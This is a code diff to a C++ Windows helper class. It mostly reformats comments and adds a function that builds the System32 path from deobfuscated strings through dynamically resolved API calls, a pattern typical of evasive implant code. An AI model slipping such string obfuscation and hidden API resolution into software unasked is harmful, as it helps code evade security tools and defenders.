@@ -354,7 +354,7 @@ void WinApiCustom::DescribeDirectoryListingCustom(IN WIN32_FIND_DATAA *pDirListi
 
     StringAggregator stringAggregator = StringAggregator(this, FALSE);
     PWIN32_FIND_DATAA pWin32FindData = NULL;
-    //CHAR datetimeModification[25] = "";
+    // CHAR datetimeModification[25] = "";
     CHAR datetimeAccess[25] = "";
     CHAR datetimeCreation[25] = "";
     CHAR attribute[45] = "";
@@ -365,11 +365,11 @@ void WinApiCustom::DescribeDirectoryListingCustom(IN WIN32_FIND_DATAA *pDirListi
         pWin32FindData = &(pDirListing[i]);
 
         // Datetime
-        //RtlZeroMemoryCustom((PBYTE)datetimeModification, 25);
+        // RtlZeroMemoryCustom((PBYTE)datetimeModification, 25);
         RtlZeroMemoryCustom((PBYTE)datetimeAccess, 25);
         RtlZeroMemoryCustom((PBYTE)datetimeCreation, 25);
 
-        //this->FileTimeToHumanFormat(&(pWin32FindData->ftLastWriteTime), datetimeModification);
+        // this->FileTimeToHumanFormat(&(pWin32FindData->ftLastWriteTime), datetimeModification);
         this->FileTimeToHumanFormat(&(pWin32FindData->ftLastAccessTime), datetimeAccess);
         this->FileTimeToHumanFormat(&(pWin32FindData->ftCreationTime), datetimeCreation);
 
@@ -455,8 +455,8 @@ void WinApiCustom::DescribeDirectoryListingCustom(IN WIN32_FIND_DATAA *pDirListi
         Integer64ToString(fileSize.QuadPart, size);
 
         // Combine all pieces of data for current listing
-        //stringAggregator.AddString(datetimeModification);
-        //stringAggregator.AddString("(m),");
+        // stringAggregator.AddString(datetimeModification);
+        // stringAggregator.AddString("(m),");
         stringAggregator.AddString(datetimeAccess);
         stringAggregator.AddString("(a),");
         stringAggregator.AddString(datetimeCreation);
@@ -552,7 +552,7 @@ BOOL WinApiCustom::CopyFileCustom(PCHAR sourcePath, PCHAR destPath)
         CHAR subDestPath[MAX_PATH] = "";
         do
         {
-            if (!CompareBuffer((LPVOID)(findFileData.cFileName), (LPVOID)".", (DWORD)1) && !CompareBuffer((LPVOID)(findFileData.cFileName), (LPVOID)"..", (DWORD)2))
+            if (!CompareBuffer((LPVOID)(findFileData.cFileName), (LPVOID) ".", (DWORD)1) && !CompareBuffer((LPVOID)(findFileData.cFileName), (LPVOID) "..", (DWORD)2))
             {
                 RtlZeroMemoryCustom((PBYTE)subSourcePath, MAX_PATH);
                 RtlZeroMemoryCustom((PBYTE)subDestPath, MAX_PATH);
@@ -719,7 +719,7 @@ BOOL WinApiCustom::DeleteFileOrDirCustom(PCHAR filePath)
         CHAR subFilePath[MAX_PATH] = "";
         do
         {
-            if (!CompareBuffer((LPVOID)(findFileData.cFileName), (LPVOID)".", (DWORD)1) && !CompareBuffer((LPVOID)(findFileData.cFileName), (LPVOID)"..", (DWORD)2))
+            if (!CompareBuffer((LPVOID)(findFileData.cFileName), (LPVOID) ".", (DWORD)1) && !CompareBuffer((LPVOID)(findFileData.cFileName), (LPVOID) "..", (DWORD)2))
             {
                 RtlZeroMemoryCustom((PBYTE)subFilePath, MAX_PATH);
 
@@ -742,4 +742,45 @@ BOOL WinApiCustom::DeleteFileOrDirCustom(PCHAR filePath)
     }
 
     return TRUE;
+}
+
+/*
+Gets System32 directory
+
+Returned double-pointer must be manually freed
+*/
+void WinApiCustom::GetSystem32Directory(CHAR **ppOutput)
+{
+    CHAR strWINDIR[STRING_ENV_WINDIR_LEN + 1] = ""; // "WINDIR"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_ENV_WINDIR,
+        STRING_ENV_WINDIR_LEN,
+        strWINDIR);
+    CHAR strSystem32[STRING_DIR_SYSTEM32_LEN + 1] = ""; // "System32"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_DIR_SYSTEM32,
+        STRING_DIR_SYSTEM32_LEN,
+        strSystem32);
+
+    *ppOutput = NULL;
+
+    DWORD windirLen = this->loadedFunctions.GetEnvironmentVariableA(strWINDIR, NULL, 0);
+    if (windirLen == 0)
+        return;
+
+    DWORD bufSize = windirLen + STRING_DIR_SYSTEM32_LEN + 1; // windirLen already holds 1 null-byte; 1-byte is for "\\"
+
+    *ppOutput = (CHAR *)(this->HeapAllocCustom(bufSize)); // windirLen already holds 1 null-byte; 1-byte is for "\\"
+    if (*ppOutput == NULL)
+        return;
+
+    if (this->loadedFunctions.GetEnvironmentVariableA(strWINDIR, *ppOutput, bufSize) == 0)
+    {
+        this->HeapFreeCustom(*ppOutput);
+        *ppOutput = NULL;
+        return;
+    }
+
+    ConcatString(*ppOutput, "\\");
+    ConcatString(*ppOutput, strSystem32);
 }
